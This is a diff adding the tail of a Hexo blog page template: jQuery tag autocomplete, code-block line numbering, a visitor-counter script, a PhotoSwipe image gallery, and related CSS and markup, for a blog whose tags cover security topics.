+<script src="/js/script.js"></script>
+<script>
+    var img_resize = 'photoSwipe';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#思考','#life','#正则','#WP','#first-blog','#ctf','#代码审计','#sqlilabs','#sqlmap','#cve','#VIM','#Nmap','#密码学','#hexo','#Nikto','#TCPDUMP','#QWASP_ZAP','#NETCAT','#docker','#Skipfish','#Vega','#复现','#文件包含','#读书摘要','#信息收集','#Web漏洞','#内网','#CTF','#文件上传','#渗透','#web','#黑客攻防web安全实战详解','#入侵','#Dvwa',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1;
+            var $numbering = $('<ul/>').addClass('pre-numbering').attr("unselectable","on");
+            $(this).addClass('has-numbering')
+                    .parent()
+                    .append($numbering);
+            for(i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info//busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+
+        // PhotoSwipe
+        $('article').each(function(i){
+            $(this).find('img').each(function(){
+                if ($(this).closest('figure').hasClass('article-gallery-img')) {
+                    return;
+                }
+                var alt = this.alt;
+                $(this)
+                    .wrap('<figure class="article-gallery-img" itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject"></figure>')
+                    .wrap('<a href="' + this.src + '" title="' + alt + '"></a>');
+                $(this).after('<div class="img_alt"><span>' + (alt || '') + '</span></div>');
+            });
+        });
+
+        var pswpElement = document.querySelectorAll('.pswp')[0];
+        if (pswpElement) {
+            var gallerySelector = '.article-gallery, article';
+
+            var initPhotoSwipeFromDOM = function(gallerySelector) {
+
+                // parse slide data (url, title, size ...) from DOM elements
+                // (children of gallerySelector)
+                var parseThumbnailElements = function(el) {
+                    var thumbElements = $(el).find('figure.article-gallery-img').toArray(),
+                        numNodes = thumbElements.length,
+                        items = [],
+                        figureEl,
+                        linkEl,
+                        size,
+                        imgEl,
+                        item;
+
+                    for (var i = 0; i < numNodes; i++) {
+
+                        figureEl = thumbElements[i]; // <figure> element
+
+                        // include only element nodes
+                        if (figureEl.nodeType !== 1) {
+                            continue;
+                        }
+
+                        linkEl = figureEl.children[0]; // <a> element
+                        imgEl = linkEl.children[0]; // <img>
+
+                        size = linkEl.getAttribute('data-size');
+                        size = size && size.split('x');
+
+                        // create slide object
+                        item = {
+                            src: linkEl.getAttribute('href'),
+                            w: size && parseInt(size[0], 10) || imgEl.width,
+                            h: size && parseInt(size[1], 10) || imgEl.height
+                        };
+
+                        if (figureEl.children.length > 1) {
+                            // <figcaption> content
+                            item.title = figureEl.children[1].innerHTML;
+                        }
+
+                        if (linkEl.children.length > 0) {
+                            // <img> thumbnail element, retrieving thumbnail url
+                            item.msrc = linkEl.children[0].getAttribute('src');
+                        }
+
+                        item.el = figureEl; // save link to element for getThumbBoundsFn
+                        items.push(item);
+                    }
+
+                    return items;
+                };
+
+                // find nearest parent element
+                var closest = function closest(el, fn) {
+                    return el && (fn(el) ? el : closest(el.parentNode, fn));
+                };
+
+                // triggers when user clicks on thumbnail
+                var onThumbnailsClick = function(e) {
+                    e = e || window.event;
+
+                    var eTarget = e.target || e.srcElement;
+
+                    // find root element of slide
+                    var clickedListItem = closest(eTarget, function(el) {
+                        return (el.tagName && el.tagName.toUpperCase() === 'FIGURE');
+                    });
+
+                    if (!clickedListItem) {
+                        return;
+                    }
+
+                    if (e.preventDefault) {
+                        e.preventDefault();
+                    } else {
+                        e.returnValue = false;
+                    }
+
+                    // find index of clicked item by looping through all child nodes
+                    // alternatively, you may define index via data- attribute
+                    var clickedGallery = $(clickedListItem).closest(gallerySelector)[0],
+                        childNodes = $(clickedGallery).find('figure.article-gallery-img').toArray(),
+                        numChildNodes = childNodes.length,
+                        nodeIndex = 0,
+                        index;
+
+                    for (var i = 0; i < numChildNodes; i++) {
+                        if (childNodes[i].nodeType !== 1) {
+                            continue;
+                        }
+
+                        if (childNodes[i] === clickedListItem) {
+                            index = nodeIndex;
+                            break;
+                        }
+                        nodeIndex++;
+                    }
+
+
+
+                    if (index >= 0) {
+                        // open PhotoSwipe if valid index found
+                        openPhotoSwipe(index, clickedGallery);
+                    }
+                    return false;
+                };
+
+                // parse picture index and gallery index from URL (#&pid=1&gid=2)
+                var photoswipeParseHash = function() {
+                    var hash = window.location.hash.substring(1),
+                        params = {};
+
+                    if (hash.length < 5) {
+                        return params;
+                    }
+
+                    var vars = hash.split('&');
+                    for (var i = 0; i < vars.length; i++) {
+                        if (!vars[i]) {
+                            continue;
+                        }
+                        var pair = vars[i].split('=');
+                        if (pair.length < 2) {
+                            continue;
+                        }
+                        params[pair[0]] = pair[1];
+                    }
+
+                    if (params.gid) {
+                        params.gid = parseInt(params.gid, 10);
+                    }
+
+                    return params;
+                };
+
+                var openPhotoSwipe = function(index, galleryElement, disableAnimation, fromURL) {
+                    var pswpElement = document.querySelectorAll('.pswp')[0],
+                        gallery,
+                        options,
+                        items;
+
+                    items = parseThumbnailElements(galleryElement);
+
+                    // define options (if needed)
+                    options = {
+
+                        // define gallery index (for URL)
+                        galleryUID: galleryElement.getAttribute('data-pswp-uid'),
+
+                        getThumbBoundsFn: function(index) {
+                            // See Options -> getThumbBoundsFn section of documentation for more info
+                            var thumbnail = items[index].el.getElementsByTagName('img')[0], // find thumbnail
+                                pageYScroll = window.pageYOffset || document.documentElement.scrollTop,
+                                rect = thumbnail.getBoundingClientRect();
+
+                            return {
+                                x: rect.left,
+                                y: rect.top + pageYScroll,
+                                w: rect.width
+                            };
+                        }
+                    };
+
+                    // PhotoSwipe opened from URL
+                    if (fromURL) {
+                        if (options.galleryPIDs) {
+                            // parse real index when custom PIDs are used
+                            // http://photoswipe.com/documentation/faq.html#custom-pid-in-url
+                            for (var j = 0; j < items.length; j++) {
+                                if (items[j].pid == index) {
+                                    options.index = j;
+                                    break;
+                                }
+                            }
+                        } else {
+                            // in URL indexes start from 1
+                            options.index = parseInt(index, 10) - 1;
+                        }
+                    } else {
+                        options.index = parseInt(index, 10);
+                    }
+
+                    // exit if index not found
+                    if (isNaN(options.index)) {
+                        return;
+                    }
+
+                    if (disableAnimation) {
+                        options.showAnimationDuration = 0;
+                    }
+
+                    // Pass data to PhotoSwipe and initialize it
+                    gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, options);
+
+                    gallery.listen('imageLoadComplete', function(index, item) {
+                        var linkEl = item.el.children[0];
+                        var img = item.container.children[0];
+                        if (!linkEl.getAttribute('data-size')) {
+                            linkEl.setAttribute('data-size', img.naturalWidth + 'x' + img.naturalHeight);
+                            item.w = img.naturalWidth;
+                            item.h = img.naturalHeight;
+                            gallery.invalidateCurrItems();
+                            gallery.updateSize(true);
+                        }
+                    });
+
+                    gallery.init();
+                };
+
+                // loop through all gallery elements and bind events
+                var galleryElements = document.querySelectorAll(gallerySelector);
+
+                for (var i = 0, l = galleryElements.length; i < l; i++) {
+                    galleryElements[i].setAttribute('data-pswp-uid', i + 1);
+                    galleryElements[i].onclick = onThumbnailsClick;
+                }
+
+                // Parse URL and open gallery if it contains #&pid=3&gid=1
+                var hashData = photoswipeParseHash();
+                if (hashData.pid && hashData.gid) {
+                    openPhotoSwipe(hashData.pid, galleryElements[hashData.gid - 1], true, true);
+                }
+            };
+
+            // execute above function
+            initPhotoSwipeFromDOM(gallerySelector);
+        }
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 2px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 2px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /*引用块样式*/
+    
+    .post .pjax article blockquote {
+        padding: 10px 20px;
+        background-color: white;
+        border: none;
+        border-left: 4px solid #42b983;
+        border-right: 4px solid #42b983;
+        border-radius: 10px;
+    }
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.1;
+        background: url("http://oy0tigw51.bkt.clouddn.com/201711210136_683.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+</style>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element, as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. PhotoSwipe keeps only 3 slides in DOM to save memory. -->
+        <!-- don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+
+
+
+</html>
